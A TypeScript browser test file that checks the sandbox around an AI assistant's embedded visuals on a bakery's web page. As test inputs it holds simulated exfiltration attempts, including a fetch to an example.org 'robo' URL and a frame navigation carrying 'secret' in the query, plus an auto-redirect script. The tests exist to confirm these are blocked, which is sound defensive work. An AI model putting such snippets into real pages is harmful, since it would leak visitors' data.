// @vitest-environment node
//
// HER VISUALS IN A REAL BROWSER (spec local 2026-11-06-asistente-propio, §5; phase 2B): the published page with her
// bubble, served locally, in the eyes' Chromium. In jsdom an iframe inside a shadow root has no window, so what the
// frame says back — its height, a link, who is talking — can only be checked here.
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";

import type { Browser, Frame, Page } from "puppeteer";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { lanzarChromium } from "@/lib/ai/visual-quality-renderer";
import { allowEgressOrigin } from "@/lib/security/egress-proxy";

import { bakeAssistantPersona } from "./assistant-widget";

const PAGE = `<!doctype html><html lang="es"><body><h1>Pastelería Canela</h1><section id="pedir" style="margin-top:2000px">Pedidos</section></body></html>`;

let server: Server;
let origin: string;
let releaseEgress: () => void;
/** The visual the next answer carries. */
let visual = "";

beforeAll(async () => {
  server = createServer((req, res) => {
    if (req.url?.startsWith("/api/assistant/")) {
      res.setHeader("access-control-allow-origin", "*");
      res.setHeader("content-type", "application/json");
      if (req.method === "POST") {
        res.end(JSON.stringify({ respuesta: "Estos son los huecos:\n\n¿Reservas?", intent: "answer", visuals: [{ title: "huecos", code: visual, at: 21 }] }));
      } else res.end(JSON.stringify({ asistente: true, chat: false, traspaso: false }));
      return;
    }
    res.setHeader("content-type", "text/html; charset=utf-8");
    if (req.url === "/elsewhere") return void res.end("<!doctype html><p>somewhere else</p>");
    res.end(bakeAssistantPersona(PAGE, { sub: "canela", apiBase: origin, businessName: "Pastelería Canela", persona: { name: "Lucía", look: { v: 1, shape: "heart", color: "#5fb8a6", eyes: "round", eyewear: "none", accessory: "crown" } } }));
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const hostPort = `127.0.0.1:${(server.address() as AddressInfo).port}`;
  origin = `http://${hostPort}`;
  // The eyes' Chromium goes through the egress proxy: this local server is let through by host:port, as serve-release's.
  releaseEgress = allowEgressOrigin(hostPort);
});
afterAll(() => {
  releaseEgress?.();
  server?.close();
});

const IFRAME = () => document.querySelector("body > div[aria-live]")!.shadowRoot!.querySelector("iframe");

/** Opens the page, asks the bubble, and returns the visual's frame once it has drawn `ready`. */
async function askForVisual(browser: Browser, code: string, ready: string): Promise<{ page: Page; frame: Frame }> {
  visual = code;
  const page = await browser.newPage();
  await page.goto(`${origin}/`, { waitUntil: "load", timeout: 20_000 });
  await page.evaluate(() => {
    const root = document.querySelector("body > div[aria-live]")!.shadowRoot!;
    (root.querySelector(".btn") as HTMLButtonElement).click();
    (root.querySelector(".ip input") as HTMLInputElement).value = "¿huecos el sábado?";
    (root.querySelector(".ip") as HTMLFormElement).requestSubmit();
  });
  const el = await page.waitForFunction(IFRAME, { timeout: 10_000 });
  const frame = (await el.asElement()!.contentFrame())!;
  await frame.waitForSelector(ready, { timeout: 10_000 });
  return { page, frame };
}

describe("her visuals in the published page's bubble", () => {
  it("🔴 a sandboxed frame that can't fetch, is held to 480px, and only follows links to the business", async () => {
    const browser = await lanzarChromium();
    try {
      const { page, frame } = await askForVisual(
        browser,
        '<a id="ok" href="#pedir">Reservar</a> <a id="bad" href="https://example.org/pagar">Pagar</a><div style="height:900px">huecos</div>',
        "#ok",
      );

      // Held to 480px, from the frame's own height message.
      await page.waitForFunction(() => (document.querySelector("body > div[aria-live]")!.shadowRoot!.querySelector("iframe") as HTMLIFrameElement).style.height === "480px", { timeout: 10_000 });

      // A null origin, and no fetch: the CSP stops it before it leaves.
      const inside = await frame.evaluate(
        () =>
          new Promise<{ origin: string; violated: string }>((resolve) => {
            document.addEventListener("securitypolicyviolation", (e) => resolve({ origin: location.origin, violated: e.violatedDirective }));
            fetch("https://example.org/robo?d=1").catch(() => {});
            setTimeout(() => resolve({ origin: location.origin, violated: "none" }), 3000);
          }),
      );
      expect(inside).toEqual({ origin: "null", violated: "connect-src" });

      // Another site: nothing happens. The business's own anchor: the page goes there.
      await frame.click("#bad");
      await new Promise((r) => setTimeout(r, 300));
      expect(page.url()).toBe(`${origin}/`);
      await frame.click("#ok");
      await page.waitForFunction(() => location.hash === "#pedir", { timeout: 5_000 });
      expect(page.url()).toBe(`${origin}/#pedir`);
    } finally {
      await browser.close();
    }
  }, 60_000);

  // Final review I1: navigating its own frame was the way out the sandbox and the CSP leave open.
  it("🔴 a visual that navigates its own frame is taken down", async () => {
    const browser = await lanzarChromium();
    try {
      const { page, frame } = await askForVisual(browser, `<button id="go" onclick="location.href='${"ORIGIN"}/elsewhere?d=secret'">Ir</button>`.replace("ORIGIN", origin), "#go");
      await frame.click("#go");
      await page.waitForFunction(() => !document.querySelector("body > div[aria-live]")!.shadowRoot!.querySelector("iframe"), { timeout: 10_000 });
    } finally {
      await browser.close();
    }
  }, 60_000);

  // Focus already inside the frame means no window blur: a second click there, some seconds later, must still count.
  it("🔴 a link clicked a while after the first click in the visual is still followed", async () => {
    const browser = await lanzarChromium();
    try {
      const { page, frame } = await askForVisual(browser, '<button id="first">Ver más</button> <a id="ok" href="#pedir">Reservar</a>', "#ok");
      await frame.click("#first");
      await new Promise((r) => setTimeout(r, 5_500));
      await frame.click("#ok");
      await page.waitForFunction(() => location.hash === "#pedir", { timeout: 5_000 });
    } finally {
      await browser.close();
    }
  }, 60_000);

  // Final review (Minor 3a, re-graded): openLink on load took the visitor away without a click.
  it("🔴 a visual can't take the visitor anywhere without a click", async () => {
    const browser = await lanzarChromium();
    try {
      const { page } = await askForVisual(browser, '<p id="x">hola</p><script>setTimeout(function(){openLink("#pedir")},100)</script>', "#x");
      await new Promise((r) => setTimeout(r, 800));
      expect(page.url()).toBe(`${origin}/`);
    } finally {
      await browser.close();
    }
  }, 60_000);
});
